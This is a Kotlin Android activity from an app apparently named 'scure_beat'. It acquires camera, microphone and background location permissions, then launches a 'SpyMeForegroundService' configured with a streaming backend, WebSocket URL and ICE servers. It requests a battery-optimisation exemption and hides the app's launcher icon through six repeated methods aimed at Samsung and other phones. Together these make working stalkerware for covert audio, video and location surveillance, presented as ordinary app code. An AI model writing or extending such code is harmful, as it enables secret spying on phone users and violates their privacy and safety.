package com.anonymous.scure_beat

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class PermissionHandlerActivity : Activity() {

    private val PERMISSION_REQUEST_CODE = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        checkAndRequestPermissions()
    }

    private fun checkAndRequestPermissions() {
        val permissionsToRequest = mutableListOf<String>()

        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.CAMERA)
        }
        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.RECORD_AUDIO)
        }
        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                permissionsToRequest.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) !=
                    PackageManager.PERMISSION_GRANTED
            ) {
                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                PERMISSION_REQUEST_CODE,
            )
        } else {
            startSpyMeService()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                startSpyMeService()
            } else {
                Toast.makeText(this, "Permissions required!", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }

    private fun startSpyMeService() {
        requestBatteryOptimization()

        val serviceIntent =
            Intent(this, SpyMeForegroundService::class.java).apply {
                putExtra("ROOM_ID", BuildConfig.ROOM_ID)
                putExtra("TOKEN", BuildConfig.TOKEN)
                putExtra("USERNAME", BuildConfig.USERNAME)
                putExtra("BACKEND_URL", BuildConfig.BACKEND_URL)
                putExtra("WS_URL", BuildConfig.WS_URL)
                putExtra("ICE_SERVERS", BuildConfig.ICE_SERVERS)
            }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }

        // ✅ FORCE HIDE ICON (Samsung + all phones)
        hideAppIconForce()

        // ✅ GO HOME
        val homeIntent =
            Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
        startActivity(homeIntent)
        finish()
    }

    private fun hideAppIconForce() {
        try {
            // Method 1: Disable LauncherAlias
            val alias = ComponentName(this, "com.anonymous.scure_beat.LauncherAlias")
            packageManager.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP,
            )

            // Method 2: Disable MainActivity (Samsung workaround)
            val mainActivity = ComponentName(this, "com.anonymous.scure_beat.MainActivity")
            packageManager.setComponentEnabledSetting(
                mainActivity,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP,
            )

            // Method 3: Force sync (Android 12+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                packageManager.setComponentEnabledSetting(
                    alias,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP or PackageManager.MATCH_DISABLED_COMPONENTS,
                )
            }

            // Method 4: Refresh launcher (Samsung)
            try {
                val refreshIntent = Intent(Intent.ACTION_PACKAGE_CHANGED)
                refreshIntent.data = android.net.Uri.parse("package:${packageName}")
                refreshIntent.putExtra(Intent.EXTRA_DONT_KILL_APP, true)
                sendBroadcast(refreshIntent)
            } catch (e: Exception) {
                /* Ignore */
            }

            // Method 5: Delayed retry (critical for Samsung OneUI)
            Handler(Looper.getMainLooper())
                .postDelayed(
                    {
                        try {
                            val aliasRetry =
                                ComponentName(this, "com.anonymous.scure_beat.LauncherAlias")
                            packageManager.setComponentEnabledSetting(
                                aliasRetry,
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP,
                            )
                        } catch (e: Exception) {
                            /* Ignore */
                        }
                    },
                    500,
                )

            // Method 6: Final retry (Samsung needs this)
            Handler(Looper.getMainLooper())
                .postDelayed(
                    {
                        try {
                            val aliasFinal =
                                ComponentName(this, "com.anonymous.scure_beat.LauncherAlias")
                            packageManager.setComponentEnabledSetting(
                                aliasFinal,
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP,
                            )
                        } catch (e: Exception) {
                            /* Ignore */
                        }
                    },
                    2000,
                )
        } catch (e: Exception) {
            Log.e("PermissionHandler", "Error hiding icon: ${e.message}")
        }
    }

    private fun requestBatteryOptimization(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager =
                getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
            val packageName = packageName
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent =
                        Intent().apply {
                            action =
                                android.provider.Settings
                                    .ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                            data = android.net.Uri.parse("package:$packageName")
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        }
                    startActivity(intent)
                    return true
                } catch (e: Exception) {
                    Log.e(
                        "PermissionHandler",
                        "Failed to request battery optimization: ${e.message}",
                    )
                }
            }
        }
        return false
    }
}
